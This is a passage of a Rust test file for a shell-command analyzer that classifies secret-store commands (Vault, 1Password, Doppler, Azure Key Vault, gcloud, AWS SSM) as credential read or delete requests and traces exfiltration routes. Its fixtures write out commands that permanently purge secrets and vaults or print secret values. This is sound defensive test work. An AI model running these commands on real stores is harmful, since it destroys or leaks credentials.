                "credential.read"
            },
        )]);
        loop {
            let before = reachable.len();
            for edge in &graph.edges {
                if reachable.contains(&edge.from) {
                    reachable.insert(edge.to.clone());
                }
            }
            if reachable.len() == before {
                break;
            }
        }
        if source.contains("curl") {
            assert!(
                reachable.contains(&interaction("credential.read")),
                "{source}"
            );
            assert_eq!(
                reachable.contains(&interaction("network.upload")),
                reaches_upload,
                "{source}"
            );
        }
        if let Some(file) = file {
            let write = plan
                .effects
                .iter()
                .find(|e| e.operation.as_str() == "filesystem.write")
                .unwrap();
            assert_eq!(display_resource(&write.resource), file, "{source}");
            assert!(
                reachable.contains(&interaction("filesystem.write")),
                "{source}"
            );
        }
        // The consumer uses the audited request as its secret source and
        // requires every edge on an exfiltration route to be exact.
        if file != Some("<fs:?>") {
            let mut exact =
                std::collections::BTreeSet::from([interaction("credential.read_request")]);
            loop {
                let before = exact.len();
                for edge in &graph.edges {
                    if exact.contains(&edge.from)
                        && edge.assurance == effinterp_proto::CausalAssurance::Exact
                        && edge.condition.is_none()
                    {
                        exact.insert(edge.to.clone());
                    }
                }
                if exact.len() == before {
                    break;
                }
            }
            if source.contains("curl") {
                assert_eq!(
                    exact.contains(&interaction("network.upload")),
                    reaches_upload,
                    "{source}"
                );
            }
            if file.is_some() {
                assert!(exact.contains(&interaction("filesystem.write")), "{source}");
            }
        }
    }
}

/// The audited request a secret-store command makes, as operation, target and
/// attributes, and the output files it writes.
fn request(source: &str) -> (String, String, serde_json::Value, Vec<String>) {
    let plan = shell(source);
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.as_str().ends_with("_request"))
        .unwrap_or_else(|| panic!("{source} must be an exact request"));
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Exact,
        "{source}"
    );
    assert!(
        plan.coverage.is_full(&Domain::new("credential")),
        "{source}"
    );
    (
        request.operation.as_str().to_string(),
        display_resource(&request.resource),
        serde_json::to_value(&request.attributes).unwrap(),
        plan.effects
            .iter()
            .filter(|effect| effect.operation.as_str() == "filesystem.write")
            .map(|effect| display_resource(&effect.resource))
            .collect(),
    )
}

fn value_read(selector: &str, output: &str) -> serde_json::Value {
    serde_json::json!({
        "mode": "value",
        "workflow": "ordinary",
        "purpose": "explicit",
        "selector": selector,
        "output": output,
    })
}

#[test]
fn vault_repeated_versions_destroy_every_version() {
    let (operation, target, attributes, _) =
        request("vault kv destroy -versions=2 -versions 3 -format=json secret/api");
    assert_eq!(operation, "credential.delete_request");
    assert_eq!(target, "cred:vault/secret/api");
    assert_eq!(attributes["version"], "2,3");
    assert_eq!(attributes["deletion"], "permanent");
}

#[test]
fn onepassword_documents_and_item_value_controls() {
    for (source, operation, target, attributes, writes) in [
        (
            "op document get document-id --vault prod",
            "credential.read_request",
            "cred:1password/prod/document-id",
            value_read("document", "stdout"),
            vec![],
        ),
        (
            "op document get document-id --vault prod --out-file doc.pdf",
            "credential.read_request",
            "cred:1password/prod/document-id",
            value_read("document", "file"),
            vec!["fs:/w/doc.pdf".to_string()],
        ),
        (
            "op document delete document-id --vault prod",
            "credential.delete_request",
            "cred:1password/prod/document-id",
            serde_json::json!({"deletion": "recoverable"}),
            vec![],
        ),
        (
            "op item get item-id --vault prod --reveal",
            "credential.read_request",
            "cred:1password/prod/item-id",
            value_read("item", "stdout"),
            vec![],
        ),
        (
            "op item get item-id --fields label=password",
            "credential.read_request",
            "cred:1password/item-id",
            value_read("item", "stdout"),
            vec![],
        ),
        (
            "op item get item-id --otp",
            "credential.read_request",
            "cred:1password/item-id",
            value_read("item", "stdout"),
            vec![],
        ),
        (
            "op read -n op://prod/service/password",
            "credential.read_request",
            "cred:1password/prod/service/password",
            value_read("path", "stdout"),
            vec![],
        ),
    ] {
        assert_eq!(
            request(source),
            (
                operation.to_string(),
                target.to_string(),
                attributes,
                writes
            ),
            "{source}"
        );
    }
}

#[test]
fn doppler_listings_environments_and_short_flags_address_the_store() {
    let destroy = serde_json::json!({"deletion": "permanent", "destroy": true});
    for (source, operation, target, attributes) in [
        (
            "doppler secrets --project service --only-names --only-names=false",
            "credential.read_request",
            "cred:doppler/service",
            value_read("store", "stdout"),
        ),
        (
            "doppler secrets download --no-file --format=json",
            "credential.read_request",
            "cred:doppler",
            {
                let mut read = value_read("store", "stdout");
                read["format"] = "json".into();
                read
            },
        ),
        (
            "doppler configs delete -c prod -p service",
            "credential.delete_request",
            "cred:doppler/service/prod",
            destroy.clone(),
        ),
        (
            "doppler configs delete --config prod --project service",
            "credential.delete_request",
            "cred:doppler/service/prod",
            destroy.clone(),
        ),
        (
            "doppler configs delete prod --project service --configuration /home/dev/.doppler.yaml",
            "credential.delete_request",
            "cred:doppler/service/prod",
            destroy.clone(),
        ),
        (
            "doppler projects delete --project service",
            "credential.delete_request",
            "cred:doppler/service",
            destroy.clone(),
        ),
        // Regression: `-y`, the documented short form of `--yes`, left the
        // delete request unproven and secrets-store-delete silent.
        (
            "doppler secrets delete API_TOKEN -p service -c prod -y",
            "credential.delete_request",
            "cred:doppler/service/prod/API_TOKEN",
            serde_json::json!({"deletion": "recoverable"}),
        ),
        (
            "doppler environments delete production --project service",
            "credential.delete_request",
            "cred:doppler/service/production",
            destroy.clone(),
        ),
    ] {
        assert_eq!(
            request(source),
            (
                operation.to_string(),
                target.to_string(),
                attributes,
                vec![]
            ),
            "{source}"
        );
    }
    // Names alone print no values.
    let names = shell("doppler secrets --project service --only-names=false --only-names");
    assert!(
        names
            .effects
            .iter()
            .all(|effect| effect.operation.domain() != "credential")
    );
}

#[test]
fn infisical_folder_paths_address_nested_secrets() {
    for (source, operation, target) in [
        (
            "infisical secrets delete API_TOKEN --projectId project --env prod --path /service",
            "credential.delete_request",
            "cred:infisical/project/prod/service/API_TOKEN",
        ),
        (
            "infisical secrets --projectId project --env prod",
            "credential.read_request",
            "cred:infisical/project/prod",
        ),
        (
            "infisical secrets --projectId project --env prod --path /service/",
            "credential.read_request",
            "cred:infisical/project/prod/service",
        ),
        (
            "infisical secrets folders delete --projectId project --env prod --path /apps --name service",
            "credential.delete_request",
            "cred:infisical/project/prod/apps/service",
        ),
    ] {
        let (actual_operation, actual_target, _, _) = request(source);
        assert_eq!(
            (actual_operation.as_str(), actual_target.as_str()),
            (operation, target),
            "{source}"
        );
    }
}

#[test]
fn azure_keyvault_objects_vaults_and_downloads() {
    let destroy = serde_json::json!({"deletion": "permanent", "destroy": true});
    let recoverable = serde_json::json!({"deletion": "recoverable"});
    for (source, operation, target, attributes, writes) in [
        (
            "az keyvault certificate delete --vault-name prod -n service-api",
            "credential.delete_request",
            "cred:azure-keyvault/prod/certificates/service-api",
            recoverable.clone(),
            vec![],
        ),
        (
            "az keyvault certificate purge --vault-name prod --name service-api",
            "credential.delete_request",
            "cred:azure-keyvault/prod/certificates/service-api",
            destroy.clone(),
            vec![],
        ),
        (
            "az keyvault key purge --id https://prod.vault.azure.net/keys/signing/1",
            "credential.delete_request",
            "cred:azure-keyvault/prod/keys/signing",
            serde_json::json!({"deletion": "permanent", "destroy": true, "version": "1"}),
            vec![],
        ),
        (
            "az keyvault delete --name prod --resource-group platform",
            "credential.delete_request",
            "cred:azure-keyvault/prod",
            recoverable.clone(),
            vec![],
        ),
        (
            "az keyvault purge --name prod --location eastus",
            "credential.delete_request",
            "cred:azure-keyvault/prod",
            destroy.clone(),
            vec![],
        ),
        (
            "az keyvault secret download --vault-name prod --name service-api --file secret.txt",
            "credential.read_request",
            "cred:azure-keyvault/prod/service-api",
            serde_json::json!({"mode": "value", "workflow": "ordinary", "purpose": "explicit", "output": "file"}),
            vec!["fs:/w/secret.txt".to_string()],
        ),
    ] {
        assert_eq!(
            request(source),
            (
                operation.to_string(),
                target.to_string(),
                attributes,
                writes
            ),
            "{source}"
        );
    }
    // Keys and certificates are only deleted and purged here.
    let show = shell("az keyvault key show --vault-name prod --name signing");
    assert!(
        show.effects
            .iter()
            .all(|effect| effect.operation.domain() != "credential")
    );
}

#[test]
fn gcloud_secret_delete_accepts_etag_and_location() {
    for (source, target) in [
        (
            "gcloud secrets delete service-api --etag=abc",
            "cred:gcloud/service-api",
        ),
        (
            "gcloud secrets delete service-api --etag abc --quiet",
            "cred:gcloud/service-api",
        ),
        (
            "gcloud secrets delete service-api --location europe-west1 --etag=abc",
            "cred:gcloud/europe-west1/service-api",
        ),
    ] {
        let (operation, actual, _, _) = request(source);
        assert_eq!(
            (operation.as_str(), actual.as_str()),
            ("credential.delete_request", target),
            "{source}"
        );
    }
}

#[test]
fn aws_ssm_parameter_hierarchy_reads_values() {
    let (operation, target, attributes, _) =
        request("aws ssm get-parameters-by-path --path /service --recursive --with-decryption");
    assert_eq!(operation, "credential.read_request");
    assert_eq!(target, "cred:aws-ssm//service");
    assert_eq!(attributes["recursive"], true);
    let (_, _, attributes, _) = request("aws ssm get-parameters-by-path --path /service");
    assert!(attributes.get("recursive").is_none());
    let conflicting =
        shell("aws ssm get-parameters-by-path --path /service --recursive --no-recursive");
    assert!(
        conflicting
            .effects
            .iter()
            .all(|effect| effect.operation.as_str() != "credential.read_request")
    );
}

#[test]
fn doppler_run_injects_its_read_into_the_child_environment() {
    // The host observed API_TOKEN unset, as it is outside the injection.
    let disclosed = |source: &str| {
        Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: effinterp_proto::HostContext {
                    env: [("HOME".into(), "/home/dev".into())].into(),
                    env_unset: ["API_TOKEN".into()].into(),
                    ..Default::default()
                },
            })
            .unwrap()
            .effects
            .iter()
            .filter(|effect| {
                effect.operation.as_str() == "environment.read"
                    && effect.attributes.get("output") == Some(&AttrValue::String("stdout".into()))
            })
            .count()
    };
    let plan = shell("doppler run --project service --config prod -- printenv API_TOKEN");
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.as_str() == "credential.read_request")
        .unwrap();
    assert_eq!(
        request.attributes.get("workflow"),
        Some(&AttrValue::String("run".into()))
    );
    // Any name may be injected, including one the parent environment lacks.
    assert_eq!(disclosed("doppler run -- printenv API_TOKEN"), 1);
    assert_eq!(disclosed("doppler run -- env"), 1);
    // An unset in the child still removes the injected name.
    assert_eq!(
        disclosed("doppler run -- env -u API_TOKEN printenv API_TOKEN"),
        0
    );
    assert_eq!(disclosed("doppler run -- npm start"), 0);
    // A child shell's expansion of any name may print an injected value, but
    // not one the script rebinds or only tests.
    assert_eq!(disclosed("doppler run -- sh -c 'echo \"$API_TOKEN\"'"), 1);
    assert_eq!(
        disclosed("doppler run -- sh -c 'API_TOKEN=public; echo \"$API_TOKEN\"'"),
        0
    );
    assert_eq!(
        disclosed("doppler run -- sh -c 'test -n \"$API_TOKEN\" && npm start'"),
        0
    );
    // A plain command string runs the same words under every shell Doppler
    // may pick from SHELL.
    assert_eq!(disclosed("doppler run --command 'printenv'"), 1);
    assert_eq!(disclosed("doppler run --command=env"), 1);
    // A string with shell syntax, whose meaning depends on that unobserved
    // choice, or a mount is not modeled as an injected child.
    for source in [
        "doppler run --command 'echo $API_TOKEN'",
        "doppler run --mount .env -- cat .env",
    ] {
        assert!(
            !shell(source)
                .effects
                .iter()
                .any(|effect| effect.operation.as_str() == "credential.read_request"),
            "{source}"
        );
    }
}
